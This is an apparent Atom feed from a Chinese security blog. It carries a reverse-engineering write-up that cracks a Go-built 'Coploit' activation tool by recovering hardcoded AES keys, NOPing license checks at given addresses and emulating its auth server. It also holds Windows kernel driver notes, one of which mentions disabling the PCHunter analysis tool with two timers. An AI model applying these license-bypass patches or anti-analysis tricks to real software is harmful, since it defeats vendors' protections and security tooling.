<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2024-03-28T10:44:27.437Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【破解】一次无害的Coploit激活工具破解</title>
    <link href="https://joe1sn.eu.org/2024/03/28/crackme-coploit/"/>
    <id>https://joe1sn.eu.org/2024/03/28/crackme-coploit/</id>
    <published>2024-03-28T06:18:41.000Z</published>
    <updated>2024-03-28T10:44:27.437Z</updated>
    
    <content type="html"><![CDATA[<p>难度：⭐</p><p>- 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-</p><span id="more"></span><p>难度一星，一颗给go，一颗给密码学，减一颗给简单的认证过程</p><h1 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h1><p>首先是来源</p><img src="https://img.joe1sn.top/uploads/big/629a93de1f16c97ddc782fa332ec2e2e.png" alt="image-20240328142334526" style="zoom:50%;" /><p>下载Windows版看看</p><p><img src="https://img.joe1sn.top/uploads/big/c89f58cc8d4e57a7febbb3b28a9abe93.png" alt="image-20240328142559130" /></p><p>哦？golang打包的，看看版本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; go version .\authTool.exe</span><br><span class="line">.\authTool.exe: go1.<span class="number">21.0</span></span><br></pre></td></tr></table></figure><p>有点难搞啊，有无Go是无符号的，IDA打开看也是一坨</p><h1 id="粗略动态"><a class="markdownIt-Anchor" href="#粗略动态"></a> 粗略动态</h1><p>这个阶段就是看网络活动，文件操作等等，先打开<code>WireShark</code>和<code>Procmon64</code></p><p><img src="https://img.joe1sn.top/uploads/big/31e2c85ca1f654ce3c318522defe02c1.png" alt="image-20240328142838195" /></p><p>然后打开软件跑一下</p><p><img src="https://img.joe1sn.top/uploads/big/be06388ed1da5f3f6edf21e8fe0a4b11.png" alt="image-20240328143029707" /></p><p>这个时候ProcessMonitor已经有了，凭经验来说这里只有网络连接有点价值</p><p><img src="https://img.joe1sn.top/uploads/big/65f90e11e593ac438eaaf16dcae07212.png" alt="image-20240328143233355" /></p><p>两个IP：<code>43.x.x.x</code>（记为ipA）和<code>149.x.x.x</code>（记为ipB），按照先后顺序看</p><p>在wireshark中<code>ip.addr == 43.x.x.x</code></p><p><img src="https://img.joe1sn.top/uploads/big/20358a76784ee006c61ced9e1cc126e0.png" alt="image-20240328143548755" /></p><p><img src="https://img.joe1sn.top/uploads/big/f05d636bb0c29798546351a070ffd061.png" alt="image-20240328143744161" /></p><p>在wireshark中<code>ip.addr == 149.x.x.x</code></p><p><img src="https://img.joe1sn.top/uploads/big/3a3d09d1f2075bd3a291766be88f7b9f.png" alt="image-20240328144255295" /></p><p>两段都是密文，一眼base64，而且解码完成过后也是乱码，接下来回到你想本身</p><h1 id="动静结合"><a class="markdownIt-Anchor" href="#动静结合"></a> 动静结合</h1><p>根据运行时候的字符串，用golang写过网络请求的小伙伴都知道，网络请求部分是在<code>net</code>库中，立刻在<code>main_main</code>中找到相关</p><p><img src="https://img.joe1sn.top/uploads/big/3503ac001cc8b3e7579f161d9a8b2604.png" alt="image-20240328145108076" /></p><p>有时间的还在静态跟流程，心急的已经开始用ida动调了</p><h2 id="43xxx"><a class="markdownIt-Anchor" href="#43xxx"></a> 43.x.x.x</h2><p>写过golang的都知道，获得发送完请求的结果需要使用一个<code>ReadAll</code>之类的东西</p><p><img src="https://img.joe1sn.top/uploads/big/7cb42a1992de2870953ab1af02b7daba.png" alt="image-20240328145645886" /></p><p>看看下面的AES解密</p><p><img src="https://img.joe1sn.top/uploads/big/28493cae840676bc3cca1bd586f440cd.png" alt="image-20240328145713758" /></p><p>发现有个相关值<code>1234567890123456</code>，但是CBC加密方式的话不知道这个是<code>key</code>还是<code>iv</code>，动态看看</p><p><img src="https://img.joe1sn.top/uploads/big/e1dd0cb4f3c84a66d33b80062eda7e9e.png" alt="image-20240328145840300" /></p><p>这里<code>slicebytetostring</code>刚好返回，根据汇编的传参，说明接收到的内容可能在<code>RAX</code>寄存器里面</p><p><img src="https://img.joe1sn.top/uploads/big/5b6937a0583f0c2bb87eb8746fb6da86.png" alt="image-20240328150411467" /></p><p>和wireshark拦截到的报文一样，跟进AES解密看看</p><p><img src="https://img.joe1sn.top/uploads/big/4872a34c83530c548d73ad5f8a9e0edf.png" alt="image-20240328150500799" /></p><p>这里可以自己确认一下，确实是Base64解码的</p><p><img src="https://img.joe1sn.top/uploads/big/b8f63dc746e6142d8fbc094e1e044b6b.png" alt="image-20240328151834101" /></p><p>这里看一下<code>crypto_aes_NewCipher</code>，根据Windows下的传参规则，看一下栈和<code>rcx</code>，<code>rdx</code>，<code>r8</code>，<code>r9</code> <code>...</code></p><p><img src="https://img.joe1sn.top/uploads/big/558d4083ef42f374961f5fa815011d77.png" alt="image-20240328152054358" /></p><p>那么应该就是Key了</p><p><img src="https://img.joe1sn.top/uploads/big/251621fe0d79cd536c57e89bc691324d.png" alt="image-20240328150718900" /></p><p>这里要开始解密了对吧，还是看下相关参数</p><p>猜测：这时候的key和iv都是<code>1234567890123456</code>，写个python脚本验证下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">key, iv, ciphertext</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(plaintext, AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密钥和IV（Initialization Vector）</span></span><br><span class="line">    key = <span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">    ciphertext = base64.b64decode(<span class="string">b&#x27;k9FQxxxxxxxxxxxxxxxxxxx9wy7w==&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    plaintext = aes_cbc_decrypt(key, iv, ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出解密后的明文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:\n&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到了两个IP，根据后续操作会把解密出的字符串按照<code>,</code>切分开，而且第一个ip就是wireshark得到的，那么就是一个主用，一个备用两个IP</p><p><img src="https://img.joe1sn.top/uploads/big/4e8202a0421cba9627f44559f8b5dafe.png" alt="image-20240328152657681" /></p><p><img src="https://img.joe1sn.top/uploads/big/c816ca26646d4fab48a4a238a21f90a1.png" alt="image-20240328153020248" /></p><h2 id="143xxx"><a class="markdownIt-Anchor" href="#143xxx"></a> 143.x.x.x</h2><p><img src="https://img.joe1sn.top/uploads/big/55bfbd6dc95952f309209799fba04d59.png" alt="image-20240328153057080" /></p><p><img src="https://img.joe1sn.top/uploads/big/8d90360b6f7c444f12e76341c51f527e.png" alt="image-20240328153154421" /></p><p><img src="https://img.joe1sn.top/uploads/big/dba1bd1ec60b516e0489b1b211857c43.png" alt="image-20240328153647769" /></p><p>这里有个很明显的拼接api的操作，得到url：<code>http://149.x.x.x:8699/api/v</code>，和ipB的流量对上了</p><p><img src="https://img.joe1sn.top/uploads/big/fc9b121500715223314b7da22858a6b6.png" alt="image-20240328153718535" /></p><p>接着用了和上面一样的解密函数，解密一下看看</p><p><img src="https://img.joe1sn.top/uploads/big/f1c66826a18679b2e386f0c76db94441.png" alt="image-20240328153927993" /></p><p>发现了一个新的url，记为<code>urlB</code></p><p><img src="https://img.joe1sn.top/uploads/big/b56778815fb0c85ffc42c713cc2b49c9.png" alt="image-20240328154034283" /></p><p><img src="https://img.joe1sn.top/uploads/big/eb683ff98d23acc7f208875322dee860.png" alt="image-20240328154130156" /></p><p>解析这个json，然后就是一些文件操作，然后来到了输入激活码的地方</p><h2 id="激活"><a class="markdownIt-Anchor" href="#激活"></a> 激活</h2><p><img src="https://img.joe1sn.top/uploads/big/32f31a0ef77265eed3d30cc39c9f4f58.png" alt="image-20240328154349545" /></p><p><img src="https://img.joe1sn.top/uploads/big/acebaa815b8afac070f436ac1a2f30f6.png" alt="image-20240328154517796" /></p><p>第一处认证，说明输入的激活码长度要为16，这里后续可能要patch，记一下patch点：<code>00000000006A3CF1</code></p><p><img src="https://img.joe1sn.top/uploads/big/12a3d4f2556f9e8c20ffdae87bdaab07.png" alt="image-20240328154705589" /></p><p>这里还有后续都做了一些信息搜集，其中包括有：时间戳，主机名(hostname)，所有网卡的mac，本地IP，还有一个user（可能是正确的激活码才会有的）</p><p><img src="https://img.joe1sn.top/uploads/big/c0f05c45877b764bf05b002d8dbb26de.png" alt="image-20240328155108207" /></p><p>这里调用了一个<code>main_ec</code>，先看一下截至目前拼接的字符串</p><p><img src="https://img.joe1sn.top/uploads/big/1cd57ec5e4bb3f6c29515afbd9bcb1e9.png" alt="image-20240328155141755" /></p><p><img src="https://img.joe1sn.top/uploads/big/0de9c338c7f0b006867940181870ff75.png" alt="image-20240328155231715" /></p><p>不用认证分析了，功能：加密，key和iv两个都试一下，密文选择后面base64过后的内容</p><p><img src="https://img.joe1sn.top/uploads/big/ca5a94668dbac66be885ae03eecf75e2.png" alt="image-20240328160202691" /></p><p><img src="https://img.joe1sn.top/uploads/big/999097adb13ed0504686ca03d6dd061c.png" alt="image-20240328160242425" /></p><p>最后发现使用，key：<code>1234567890ABCDEF</code>，iv：<code>ABCDEF1234567890</code></p><p><img src="https://img.joe1sn.top/uploads/big/0729af5ea300c003fc8e94c3d0fba1cb.png" alt="image-20240328160352591" /></p><p><img src="https://img.joe1sn.top/uploads/big/005fbc331117868d3c9de5f3f78f72ae.png" alt="image-20240328160553109" /></p><p><img src="https://img.joe1sn.top/uploads/big/595b90a0eb802058cc030c48b42a0727.png" alt="image-20240328160643189" /></p><p>拼接好参数，用最开始通讯的密钥和iv进行加密，使用POST送回服务端，貌似我们距离最后的认证也来越近了</p><h2 id="校验"><a class="markdownIt-Anchor" href="#校验"></a> 校验</h2><p><img src="https://img.joe1sn.top/uploads/big/f2a23063aa38d9de6ae9abd3b4c91551.png" alt="image-20240328161126355" /></p><p><img src="https://img.joe1sn.top/uploads/big/c2dc2cea4390441735ea54de46c3b8f5.png" alt="image-20240328161105890" /></p><p>接收到返回后就开始各种比较，那么这里就是校验的地方了，直接nop或者jmp掉就可以了，注意jmp的话栈上面的修改别覆盖了，得到第二个patch的位置：<code>00000000006A4293</code></p><p>这里动态调试我就直接改rip过了</p><p><img src="https://img.joe1sn.top/uploads/big/776b072899c97c4555bd43f6fc3f1d9f.png" alt="image-20240328161249744" /></p><p><img src="https://img.joe1sn.top/uploads/big/267212cc688c5fa796fe0fb187050b82.png" alt="image-20240328161327045" /></p><h2 id="破解coploit"><a class="markdownIt-Anchor" href="#破解coploit"></a> 破解coploit</h2><p>哈哈，你不会真的以为有什么方法能免费试用coploit吧</p><p>无害之处就在于此</p><p>就和chatGPT一样，这个用的时候要联网，联网会验证token，所以这样的token肯定没有在他数据库里面注册过</p><p>这些平台只是做一个流量转发，买几个<code>key</code>然后做个token转换然后卖给大家用而已，是不是割韭菜就仁者见仁智者见智了</p><p><img src="https://img.joe1sn.top/uploads/big/22c3130c52d0e00b096e9c321edab646.png" alt="image-20240328161936587" /></p><p>根据我所了解的大多是修改js文件等等的操作进行的，后续具体修改插件什么的操作，js相关文件怎么实现的，就不再分析了，点到为止</p><h1 id="打包"><a class="markdownIt-Anchor" href="#打包"></a> 打包</h1><p>截图的地址可能有问题是因为我重新用IDA打开过一次</p><h2 id="0x6a3cf1"><a class="markdownIt-Anchor" href="#0x6a3cf1"></a> 0x6A3CF1</h2><p><img src="https://img.joe1sn.top/uploads/big/049b9079c31f292231c347531bbd9aab.png" alt="image-20240328162119065" /></p><p>nop掉，但是这个内容会返回到服务端，如果服务端默认这个是16个字符串而且使用了下标寻找内容，可能会出问题</p><p><img src="https://img.joe1sn.top/uploads/big/43da0b7f6494ae69af300c66d51e068d.png" alt="image-20240328162228494" /></p><h2 id="0x6a4293"><a class="markdownIt-Anchor" href="#0x6a4293"></a> 0x6A4293</h2><p>需要注意的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000006A42B5                 mov     rax, [rsp+0A58h+var_5F0]</span><br><span class="line">.text:00000000006A42BD                 mov     rbx, [rsp+0A58h+var_968]</span><br><span class="line">.text:00000000006A42C5                 mov     rcx, [rsp+0A58h+var_560]</span><br><span class="line">.text:00000000006A42CD                 mov     rdi, [rsp+0A58h+var_8C8]</span><br><span class="line">.text:00000000006A42D5                 mov     rsi, [rsp+0A58h+var_680]</span><br><span class="line">.text:00000000006A42DD                 mov     r8, [rsp+0A58h+var_9C8]</span><br><span class="line">.text:00000000006A42E5                 call    main_writeHostsJSON2</span><br></pre></td></tr></table></figure><p>这段修改了寄存器的值，如果跳过可能对<code>main_writeHostsJSON2</code>有不好的影响，把校验全部nop</p><p><img src="https://img.joe1sn.top/uploads/big/140e555b7072a7895ccbdb0e9a0b3476.png" alt="image-20240328165823229" /></p><hr /><p>初步达到效果</p><p><img src="https://img.joe1sn.top/uploads/big/1b49ee80f0fd38cca8e43806ae1aede7.png" alt="image-20240328170337749" /></p><h2 id="网络连接"><a class="markdownIt-Anchor" href="#网络连接"></a> 网络连接</h2><h3 id="思路a"><a class="markdownIt-Anchor" href="#思路a"></a> 思路A</h3><p>根据相关传参，按照一下两次<code>jmp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text: 00000000006631B9                 call    net_http___Client__Get</span><br><span class="line">.text: 00000000006638D8                 call    os_UserHomeDir</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">.text: 00000000006641B4                 call    net_http___Client__Post</span><br><span class="line">.text: 00000000006642B5                 mov     rax, [rsp+0A58h+var_5F0]</span><br></pre></td></tr></table></figure><h3 id="思路b"><a class="markdownIt-Anchor" href="#思路b"></a> 思路B</h3><p>修改域名和ip为自己的，自己搭一套服务</p><ol><li><p>urlA的网络模拟</p><p><code>urls</code> =<code> authURL_A</code>+“,”+<code>authURL_B</code></p><p>使用Key-iv = <code>1234567890123456</code>-<code>1234567890123456</code>进行AES-CBC加密<code>urls </code>并返回</p></li><li><p>urlB的网络模拟</p><p>返回如下json值</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;link&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://xxxxx.xyz/xxxx.html&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;x.x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span>x<span class="punctuation">,</span><span class="attr">&quot;linktext&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxx&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>接收post传参，返回值随便（客户端得patch）</p></li></ol><hr /><p>最终效果</p><p><img src="https://img.joe1sn.top/uploads/big/91efd3518aff1ad455201e80e1a155dc.png" alt="image-20240328174729083" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;难度：⭐&lt;/p&gt;
&lt;p&gt;- 要不要后面把怎么写外挂啥的放上来？还是说开一个知识星球？-&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="crack" scheme="https://joe1sn.eu.org/tags/crack/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 8-计时器与通知</title>
    <link href="https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/"/>
    <id>https://joe1sn.eu.org/2024/03/27/windows-kernel-driver-8-timer-notify/</id>
    <published>2024-03-27T08:00:21.000Z</published>
    <updated>2024-03-27T10:25:22.723Z</updated>
    
    <content type="html"><![CDATA[<p>在内核中使用定时器、通知和回调</p><p>…学到一半打靶场去了</p><h1 id="定时器"><a class="markdownIt-Anchor" href="#定时器"></a> 定时器</h1><p>CPU最短能统计时间为100纳秒 100ns</p><p>内核中使用LARGEINT来表示时间长度</p><p>1s = -10 *1000 * 1000</p><h2 id="基于设备的io定时器"><a class="markdownIt-Anchor" href="#基于设备的io定时器"></a> 基于设备的IO定时器</h2><p>在<code>DriverEntry</code>里面尝试一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TimeWorker</span><span class="params">(PVOID CONTEXT)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Irql: %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process: %s\n&quot;</span>, <span class="built_in">PsGetProcessImageFileName</span>(<span class="built_in">PsGetCurrentProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//    ...</span></span><br><span class="line">    <span class="built_in">IoInitializeTimer</span>(pDevice, TimeWorker, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">IoStartTimer</span>(pDevice);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Unload</span>()&#123;</span><br><span class="line">    <span class="built_in">IoStopTimer</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d8a887058e533a26fd3119640ff28557.png" alt="image-20240327161718432" /></p><p>主要API</p><ul><li><p><code>IoInitializeTimer</code>：创建定时</p></li><li><p><code>IoStartTimer</code>：开启定时</p></li><li><p><code>IoStopTimer</code>：关闭定时</p></li></ul><p>技巧</p><ul><li>同时启用两个定时器可以关闭PCHUNTER</li><li>做认证</li></ul><h2 id="结合dpc的定时器"><a class="markdownIt-Anchor" href="#结合dpc的定时器"></a> 结合DPC的定时器</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line">KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LARGE_INTEGER DpcTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeInitializeTimer</span>(&amp;keTimer);</span><br><span class="line">    KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">KeInitializeDpc</span>(&amp;kDPC, &amp;DpcRoutineFunc, <span class="literal">NULL</span>);</span><br><span class="line">    LARGE_INTEGER DpcTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DpcTime.QuadPart = <span class="number">-10</span> * <span class="number">1000</span> * <span class="number">2000</span>;</span><br><span class="line">    <span class="built_in">KeSetTimer</span>(&amp;keTimer, DpcTime, &amp;kDPC);</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeCancelTimer</span>(&amp;keTimer);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f9b8a75ab6eab4e335c7f7f88140713f.png" alt="image-20240327164409369" /></p><ul><li>后续可以通过<code>KeWait</code>来判断超时之类的</li><li>这个只会触发一次</li></ul><p><strong>放在工作队列线程池中运行</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ExInitializeWorkItem</span>(&amp;work_item, WorkItemRoutine, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ExQueueWorkItem</span>(&amp;work_item, CriticalWorkQueue);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/8252549ad4ddd4cf75ab29a1ca6c01cb.png" alt="image-20240327170200351" /></p><ul><li>例程级别很低</li><li><code>WorkItemRoutine</code>别陷入死循环，<strong>同步</strong></li></ul><h1 id="通知"><a class="markdownIt-Anchor" href="#通知"></a> 通知</h1><p>通知：发生某一件事变更，知道事情变更，但不能操作变更的结果。<code>PsCreateNotify</code></p><p>回调：能拦截相关信息，更改流程和结果。</p><p><a href="https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/">windows内核驱动 6-链表与进程</a>讲了部分</p><p>模块加载回调：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ImageRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PUNICODE_STRING FullImageName,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessId,                <span class="comment">// pid into which image is being mapped</span></span></span></span><br><span class="line"><span class="params"><span class="function">    PIMAGE_INFO ImageInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//DbgPrint(&quot;Triigered callback\n&quot;);</span></span><br><span class="line">    PEPROCESS temppe = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    status = <span class="built_in">PsLookupProcessByProcessId</span>(ProcessId, &amp;temppe);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">ObDereferenceObject</span>(temppe);</span><br><span class="line">        PUCHAR imagename = <span class="built_in">PsGetProcessImageFileName</span>(temppe);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[%s] load [%wZ] with baseaddr [%llx]\n&quot;</span>, imagename, FullImageName, ImageInfo-&gt;ImageBase);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DbgPrint(&quot;FullImageName: %wZ---PID: %d\n&quot;, FullImageName, ProcessId);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PsSetLoadImageNotifyRoutine</span>(ImageRoutine);</span><br><span class="line"><span class="built_in">PsRemoveLoadImageNotifyRoutine</span>(ImageRoutine);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c39428184cbd25839e0f744924c3ea0e.png" alt="image-20240327175140251" /></p><p>其他的也很类似</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在内核中使用定时器、通知和回调&lt;/p&gt;
&lt;p&gt;…学到一半打靶场去了&lt;/p&gt;
&lt;h1 id=&quot;定时器&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#定时器&quot;&gt;&lt;/a&gt; 定时器&lt;/h1&gt;
&lt;p&gt;CPU最短能统计时间为100纳秒 100ns&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 7-进程同步</title>
    <link href="https://joe1sn.eu.org/2024/03/21/windows-kernel-driver-7-process-sync/"/>
    <id>https://joe1sn.eu.org/2024/03/21/windows-kernel-driver-7-process-sync/</id>
    <published>2024-03-21T02:00:52.000Z</published>
    <updated>2024-03-21T03:09:10.475Z</updated>
    
    <content type="html"><![CDATA[<p>日常复习操作系统</p><span id="more"></span><h1 id="同步方式"><a class="markdownIt-Anchor" href="#同步方式"></a> 同步方式</h1><ul><li>自旋锁，之前讲过了</li><li>信号量</li><li>互斥体</li><li><strong>事件同步</strong></li></ul><h1 id="事件同步"><a class="markdownIt-Anchor" href="#事件同步"></a> 事件同步</h1><p>基于事件的同步，理解原理比写代码更重要</p><p><img src="https://img.joe1sn.top/uploads/big/1ddff357201270d4320d39033ffede78.png" alt="image-20240321102341054" /></p><p>感觉上和R3的使用差不多</p><ul><li><p><code>KeInitializeEvent(&amp;kEvent, NotificationEvent, FALSE);</code></p><p><code>NotificationEvent</code>：通知事件，手动处理，一般只用一次</p><p><code>SynchronizationEvent</code>：同步事件，<code>KeWaitForSingleObject</code>等待通过，及不需要<code>KeResetEvent</code>，系统自动设置为未激发态</p></li><li><p>如果在R3使用Event传递<code>Handle</code>到R0，由于HANDLE不是全局，所以得<code>ObReferenceObj</code></p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">KThreadB</span><span class="params">(PVOID context)</span> </span>&#123;</span><br><span class="line">    LARGE_INTEGER sleeptime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PKEVENT pevent = (PKEVENT)context;</span><br><span class="line">    sleeptime.QuadPart = <span class="number">-100</span> * <span class="number">10</span> * <span class="number">1000</span> * <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">KeDelayExecutionThread</span>(KernelMode, FALSE, &amp;sleeptime);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Traggering envet\n&quot;</span>);</span><br><span class="line">        <span class="built_in">KeSetEvent</span>(pevent, IO_NO_INCREMENT, FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PsTerminateSystemThread</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">KThreadA</span><span class="params">(PVOID context)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(context);</span><br><span class="line">    <span class="built_in">KeInitializeEvent</span>(&amp;kEvent, NotificationEvent, FALSE);</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span 